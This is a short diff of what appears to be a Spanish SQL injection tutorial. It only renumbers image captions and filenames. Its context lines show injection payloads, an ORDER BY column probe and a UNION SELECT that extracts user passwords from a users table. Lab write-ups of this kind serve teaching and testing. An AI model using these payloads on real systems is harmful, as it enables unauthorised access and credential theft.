@@ -150,7 +150,7 @@ SELECT * FROM users WHERE id = '1' ORDER BY 1 -- -';
 ' UNION SELECT user, password FROM users#
 
 ```
-*Imagen 5*
+*Imagen 6*
 
 ![alt_text](imagen5.png "image_tooltip")
 
@@ -162,13 +162,13 @@ SELECT id, name FROM products WHERE id = '' UNION SELECT user, password FROM use
 ```
 *Imagen 6*
 
-![alt_text](imagen6.png "image_tooltip")
+![alt_text](imagen7.png "image_tooltip")
 
 Hemos conseguido la siguiente información:
 
 *Imagen 7*
 
-![alt_text](imagen7.png "image_tooltip")
+![alt_text](imagen8.png "image_tooltip")
 
 <table>
   <tr>
